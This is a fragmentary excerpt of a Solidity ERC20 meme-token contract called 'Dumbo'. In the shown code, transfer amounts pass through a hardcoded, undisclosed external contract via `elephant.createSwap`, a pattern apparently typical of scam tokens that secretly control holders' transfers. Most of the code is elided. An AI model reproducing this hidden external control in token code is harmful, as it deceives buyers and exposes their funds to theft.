...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _elephant = 0xa87b37D8c215E0Cf16C1f88c63053CFF98bc6B19;
    address public pair;
    ...
    function theAmount(uint256 amount) internal returns (uint256) {
        return elephant.createSwap(amount);
    }
    ...
    function _DeployDumbo(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDumbo(creator, initialSupply);
    }
}

contract Dumbo is ERC20Token {
    constructor() ERC20Token("Dumbo", "DUMBO", msg.sender, 6942069420 * 10 ** 18) {
    }
}